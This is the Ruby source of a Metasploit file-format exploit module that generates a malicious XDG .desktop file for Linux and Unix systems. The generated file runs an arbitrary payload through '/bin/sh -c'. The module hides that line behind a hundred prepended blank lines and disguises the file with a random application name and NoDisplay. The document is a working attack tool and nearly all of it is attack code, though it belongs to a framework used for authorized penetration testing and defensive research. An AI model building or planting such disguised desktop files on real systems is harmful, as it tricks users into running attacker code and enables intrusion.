##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Malicious XDG Desktop File',
        'Description' => %q{
          This module creates a malicious XDG Desktop (.desktop) file.

          On most modern systems, desktop files are not trusted by default.
          The user will receive a warning prompt that the file is not trusted
          when running the file, but may choose to run the file anyway.

          The default file manager applications in some desktop environments
          may impose more strict execution requirements by prompting the user
          to set the file as executable and/or marking the file as trusted
          before the file can be executed.
        },
        'Author' => [
          'bcoles'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['ATT&CK', Mitre::Attack::Technique::T1204_002_MALICIOUS_FILE],
          ['URL', 'https://specifications.freedesktop.org/desktop-entry-spec/latest/'],
          ['URL', 'https://specifications.freedesktop.org/desktop-entry-spec/latest/exec-variables.html'],
          ['URL', 'https://wiki.archlinux.org/title/Desktop_entries']
        ],
        'Platform' => %w[linux unix solaris freebsd],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [ 'Automatic', {} ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => false,
        'DisclosureDate' => '2007-02-06',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [SCREEN_EFFECTS]
        }
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'The desktop file name.', 'msf.desktop']),
      OptString.new('APPLICATION_NAME', [false, 'The application name. Some file managers will display this name instead of the file name. (default is random)', '']),
    ])

    register_advanced_options([
      OptInt.new('PrependNewLines', [false, 'Prepend new lines before the payload.', 100]),
    ])
  end

  def application_name
    datastore['APPLICATION_NAME'].blank? ? rand_text_alpha(6..12) : datastore['APPLICATION_NAME']
  end

  def exploit
    values = [
      'Type=Application',
      "Name=#{application_name}",
      # 'Hidden=true', # This property is not supported by old systems, which prevents execution
      'NoDisplay=true',
      'Terminal=false'
    ]
    desktop = "[Desktop Entry]\n"
    desktop << values.shuffle.join("\n")
    desktop << "\n"
    desktop << "\n" * datastore['PrependNewLines']

    escaped_payload = payload.encoded.gsub('\\', '\\\\\\').gsub('"', '\\"')
    desktop << "Exec=/bin/sh -c \"#{escaped_payload}\""

    file_create(desktop)
  end
end
